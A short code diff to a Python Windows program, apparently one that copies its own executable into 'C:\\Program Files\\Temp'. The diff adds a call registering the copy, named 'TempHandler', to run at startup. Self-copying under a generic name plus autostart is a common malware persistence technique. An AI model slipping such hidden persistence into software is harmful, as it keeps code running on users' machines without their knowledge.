@@ -19,6 +19,7 @@ if getattr(sys, 'frozen', False):
     source_file = sys.executable
 else:
     source_file = __file__
+source_file_for_copied_exe = 'C:\\Program Files\\Temp\\TempHandler.exe'
 
 destination_dir = 'C:\\Program Files\\Temp'
 
@@ -35,6 +36,8 @@ except PermissionError:
 except Exception as e:
     messagebox.showerror(title='Error', message=f'An unexpected error occurred: {e}')
     sys.exit()
+
+add_to_startup(source_file_for_copied_exe, app_name="TempHandler")
 
 running = True
 
